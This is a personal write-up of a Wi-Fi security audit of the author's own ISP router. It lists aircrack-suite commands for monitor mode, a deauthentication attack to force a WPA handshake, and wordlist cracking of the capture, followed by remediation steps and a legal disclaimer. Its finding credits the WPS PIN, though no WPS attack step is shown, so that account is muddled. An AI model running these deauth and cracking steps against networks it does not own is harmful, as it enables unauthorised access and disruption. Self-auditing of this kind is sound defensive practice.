Auditing My Own Wi-Fi: A WPS Case Study

How a forgotten, enabled WPS service on my own home router let me recover a working Wi-Fi credential in minutes — and the three settings that closed the gap for good.

scope: own equipment only — home lab Kali Linux · dual-boot

Why I ran this

I set up Kali Linux in dual-boot alongside Windows 11 and wanted a real, hands-on target instead of a lab VM — so I pointed it at my own router. The goal wasn't to "hack" anything impressive; it was to see what an unmodified, ISP-provided router actually exposes by default, and to practice the full workflow end to end: recon, capture, verification, and — the part most write-ups skip — fixing what I found.

Environment

Target My own ISP-provided VDSL router (TOPNET), home network
Firmware Dated 2021 — no update applied at time of testing
Encryption WPA/WPA2 mixed mode (TKIP + AES)
WPS Enabled — default, never turned off

Procedure

Every step below was run against the network and router listed above.

01 — identify the interface

$ iw dev

$ ip link show

$ rfkill list

02 — enable monitor mode

$ sudo airmon-ng check kill

$ sudo airmon-ng start wlan0

03 — passive scan of nearby networks

$ sudo airodump-ng wlan0mon

04 — check WPS status (read-only)

$ sudo wash -i wlan0mon

This is the step that first flagged the problem — WPS showed as enabled, with no modification to anything.

05 — start a targeted capture

$ sudo airodump-ng --bssid <BSSID> -c <channel> -w capture wlan0mon

06 — force a handshake (deauth)

$ sudo aireplay-ng --deauth 5 -a <BSSID> wlan0mon

Confirmed by "WPA handshake: <BSSID>" appearing in the capture window — without that line, there's nothing to verify yet.

07 — verify password strength

$ sudo aircrack-ng -w <wordlist> -b <BSSID> capture-01.cap

08 — restore normal state

$ sudo airmon-ng stop wlan0mon

$ sudo systemctl restart NetworkManager

Finding

With WPS enabled and firmware untouched since 2021, the router's WPS PIN exchange was the weak point — not the Wi-Fi password itself, however strong it was. Once the PIN exchange was recovered, the actual WPA passphrase came with it, confirmed against the captured handshake. The delay between starting the test and getting a result (a few minutes, not seconds) lines up with a PIN exchange plus a forced handshake capture — not an instant "crack," and not evidence of anything being transmitted in the clear.

Remediation

  • 01 Disabled WPS. Zero effect on any connected device — WPS only governs the push-button/PIN pairing method, not normal password-based connections.
  • 02 Reviewed TKIP vs. AES-only. Checked the connected-device list first; since mixed mode was carrying some legacy-device weight, this one is being tested gradually rather than flipped outright.
  • 03 Checked for a firmware update through the router's admin panel and the ISP, since the installed version predates most public WPS-related fixes.

scope & responsible use

Every command, tool, and finding documented in this section was executed exclusively against network infrastructure that I own and personally administer — my own home router, on my own premises, as part of a self-directed learning lab. No step described here was performed against any third-party network, device, or individual without explicit authorization.

Wireless security testing techniques — including monitor-mode packet capture, deauthentication, and password-strength verification — are standard, widely taught methods in networking and cybersecurity education. They are documented here for that purpose: to demonstrate applied understanding of the 802.11 protocol and of common home-router misconfigurations, and to show the remediation steps that followed.

Using any of these tools or techniques against a network, device, or account you do not own, and do not have explicit, verifiable, written authorization to test, is illegal in Tunisia and in virtually every jurisdiction worldwide, and may carry serious criminal and civil consequences. This page is not an invitation or endorsement to do so.

I take no responsibility for how a third party chooses to use this information. If you are testing your own equipment, confirm you are the legal owner or administrator before proceeding, and always restore your network to a secure configuration afterward.
